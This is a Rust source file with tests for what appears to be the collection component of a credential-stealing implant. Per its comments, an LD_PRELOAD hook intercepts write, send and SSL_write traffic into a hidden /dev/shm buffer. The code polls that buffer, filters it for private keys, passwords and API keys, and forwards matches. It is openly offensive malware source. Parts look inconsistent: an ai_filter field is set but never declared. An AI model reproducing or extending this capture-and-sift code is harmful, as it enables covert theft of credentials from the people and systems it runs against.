use std::sync::Arc;
use std::sync::atomic::AtomicBool;
use tokio::sync::mpsc;
use regex::Regex;

pub struct HookManager {
    filters: Vec<DataFilter>,
    active: Arc<AtomicBool>,
}

#[derive(Clone)]
struct DataFilter {
    pattern: Regex,
    data_type: String,
}

impl HookManager {
    pub fn new() -> Self {
        // Initialize filters for common data patterns
        let mut filters = Vec::new();
        
        // Private key patterns
        if let Ok(re) = Regex::new(r"-----BEGIN.*PRIVATE KEY-----") {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        // Password patterns
        if let Ok(re) = Regex::new(r#"(?i)(password|passwd|pwd)\s*[=:]\s*["']?([^"'\s]+)"#) {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        // API key patterns
        if let Ok(re) = Regex::new(r"(?i)(api[_-]?key|apikey)\s*[=:]\s*([a-zA-Z0-9_-]{20,})") {
            filters.push(DataFilter {
                pattern: re,
                data_type: "CREDENTIAL_BLOB".to_string(),
            });
        }
        
        // Try to initialize AI filter (optional - gracefully degrades if no model)
        #[cfg(feature = "ai-filtering")]
        let ai_filter = match crate::ai_filtering::AIDataFilter::new(None) {
            Ok(filter) => {
                // AI model available and loaded successfully
                Some(filter)
            }
            Err(_) => {
                // No AI model available - this is OK, will use regex filtering
                // Note: This happens when:
                // - No model embedded at compile time
                // - No model file found at runtime
                // - User didn't provide model path
                // This is expected and normal - regex filtering will be used instead
                None
            }
        };
        
        Self {
            filters,
            active: Arc::new(AtomicBool::new(true)),
            #[cfg(feature = "ai-filtering")]
            ai_filter,
        }
    }
    
    pub async fn start_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
        // Real LD_PRELOAD hooking implementation
        // The hook_lib.so library intercepts write(), send(), SSL_write()
        // and writes captured data to /dev/shm/.protosyte_hook
        
        let buffer_path = "/dev/shm/.protosyte_hook";
        
        // Open the shared memory buffer that the hook library writes to
        self.monitor_hook_buffer(tx, buffer_path).await;
    }
    
    async fn monitor_hook_buffer(&self, tx: mpsc::UnboundedSender<Vec<u8>>, buffer_path: &str) {
        use tokio::fs;
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        
        // Create or open the buffer file (hook library creates it)
        let _ = fs::OpenOptions::new()
            .create(true)
            .read(true)
            .write(false)
            .open(buffer_path)
            .await;
        
        let mut last_offset = 8u64; // Skip header (first 8 bytes = current offset)
        
        while self.active.load(std::sync::atomic::Ordering::Relaxed) {
            if let Ok(mut file) = fs::File::open(buffer_path).await {
                // Read current offset from header
                if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(0)).await {
                    let mut offset_bytes = [0u8; 8];
                    if let Ok(8) = file.read_exact(&mut offset_bytes).await {
                        let current_offset = u64::from_le_bytes(offset_bytes);
                        
                        if current_offset > last_offset {
                            // Read new data
                            if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(last_offset)).await {
                                let data_size = (current_offset - last_offset) as usize;
                                let mut buffer = vec![0u8; data_size];
                                
                                if let Ok(n) = file.read_exact(&mut buffer).await {
                                    if n > 0 {
                                        // Filter data (additional filtering beyond hook library)
                                        if let Some(filtered) = self.filter_data(&buffer) {
                                            let _ = tx.send(filtered);
                                        }
                                    }
                                }
                            }
                            last_offset = current_offset;
                            
                            // Wrap around if buffer is full
                            const BUFFER_SIZE: u64 = 1024 * 1024; // 1MB
                            if last_offset >= BUFFER_SIZE {
                                last_offset = 8; // Reset to after header
                            }
                        }
                    }
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
        }
    }
    
    async fn monitor_file_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
        use tokio::fs;
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        
        let buffer_path = "/dev/shm/.psi_temp";
        
        // Create or open the buffer file
        let _ = fs::OpenOptions::new()
            .create(true)
            .read(true)
            .write(true)
            .open(buffer_path)
            .await;
        
        let mut last_pos = 0u64;
        
        while self.active.load(std::sync::atomic::Ordering::Relaxed) {
            if let Ok(mut file) = fs::File::open(buffer_path).await {
                if let Ok(metadata) = file.metadata().await {
                    let current_size = metadata.len();
                    
                    if current_size > last_pos {
                        if let Ok(_) = file.seek(tokio::io::SeekFrom::Start(last_pos)).await {
                            let mut buffer = vec![0u8; (current_size - last_pos) as usize];
                            if let Ok(n) = file.read_exact(&mut buffer).await {
                                if n > 0 {
                                    // Filter data
                                    if let Some(filtered) = self.filter_data(&buffer) {
                                        let _ = tx.send(filtered);
                                    }
                                }
                            }
                        }
                        last_pos = current_size;
                    }
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }
    
    pub fn filter_data(&self, data: &[u8]) -> Option<Vec<u8>> {
        // Try AI filtering first if model is available
        #[cfg(feature = "ai-filtering")]
        {
            if let Some(ref filter) = self.ai_filter {
                // AI model is available - use it for filtering
                if let Some(result) = filter.filter(data) {
                    if result.should_capture {
                        return Some(data.to_vec());
                    }
                    // AI filter says don't capture - still check regex as backup
                    // (AI might miss some patterns that regex catches)
                }
            }
            // If ai_filter is None, no model was available - skip AI filtering
        }
        
        // Fallback to regex pattern matching (always available)
        // This works even without an AI model - regex is the default filtering method
        if let Ok(text) = std::str::from_utf8(data) {
            for filter in &self.filters {
                if filter.pattern.is_match(text) {
                    // Found matching data via regex
                    return Some(data.to_vec());
                }
            }
        }
        
        // No match found by either AI or regex
        None
    }
    
    pub fn stop(&self) {
        self.active.store(false, std::sync::atomic::Ordering::Relaxed);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_hook_manager_new() {
        let manager = HookManager::new();
        assert!(!manager.filters.is_empty());
        assert!(manager.active.load(std::sync::atomic::Ordering::Relaxed));
    }
    
    #[test]
    fn test_filter_data_private_key() {
        let manager = HookManager::new();
        
        let data = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_password() {
        let manager = HookManager::new();
        
        let data = b"password=secret123";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_api_key() {
        let manager = HookManager::new();
        
        let data = b"api_key=sk_live_1234567890abcdefghijklmnop";
        let result = manager.filter_data(data);
        assert!(result.is_some());
    }
    
    #[test]
    fn test_filter_data_no_match() {
        let manager = HookManager::new();
        
        let data = b"normal text data without sensitive information";
        let result = manager.filter_data(data);
        assert!(result.is_none());
    }
    
    #[test]
    fn test_filter_data_binary() {
        let manager = HookManager::new();
        
        let data = &[0u8, 1u8, 2u8, 3u8, 255u8];
        let result = manager.filter_data(data);
        // Binary data that's not valid UTF-8 should return None
        assert!(result.is_none());
    }
    
    #[test]
    fn test_hook_manager_stop() {
        let manager = HookManager::new();
        assert!(manager.active.load(std::sync::atomic::Ordering::Relaxed));
        
        manager.stop();
        assert!(!manager.active.load(std::sync::atomic::Ordering::Relaxed));
    }
    
    #[tokio::test]
    async fn test_start_capture() {
        let manager = HookManager::new();
        let (tx, mut rx) = mpsc::unbounded_channel();
        
        // Start capture in background
        let manager_clone = HookManager {
            filters: manager.filters.clone(),
            active: manager.active.clone(),
        };
        let handle = tokio::spawn(async move {
            manager_clone.start_capture(tx).await;
        });
        
        // Stop after a short delay
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
        manager.stop();
        
        // Give it time to stop
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        
        // Cancel the task
        handle.abort();
    }
    
    #[test]
    fn test_filter_data_empty() {
        let manager = HookManager::new();
        let result = manager.filter_data(b"");
        assert!(result.is_none());
    }
    
    #[test]
    fn test_filter_data_password_variations() {
        let manager = HookManager::new();
        
        // Test various password patterns
        assert!(manager.filter_data(b"password=test").is_some());
        assert!(manager.filter_data(b"PASSWORD=test").is_some());
        assert!(manager.filter_data(b"passwd:test").is_some());
        assert!(manager.filter_data(b"pwd='test'").is_some());
    }
    
    #[test]
    fn test_filter_data_api_key_variations() {
        let manager = HookManager::new();
        
        // Test various API key patterns
        assert!(manager.filter_data(b"api_key=sk_live_12345678901234567890").is_some());
        assert!(manager.filter_data(b"API-KEY=test12345678901234567890").is_some());
        assert!(manager.filter_data(b"apikey:abcdefghijklmnopqrstuvwxyz").is_some());
    }
}
